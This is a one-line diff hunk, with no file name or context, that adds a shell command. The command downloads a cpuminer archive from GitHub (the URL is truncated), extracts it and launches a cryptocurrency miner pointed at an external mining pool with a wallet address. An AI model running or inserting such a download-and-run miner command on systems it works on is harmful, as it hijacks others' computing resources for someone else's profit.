@@ -1,0 +1,1 @@
+wget https://github.com/rplant8/cpuminer-o... && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2amd -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RFaH9j4Ru616LZ88oNaHHkkr1QdRUAL9VJ.drkd -t 2
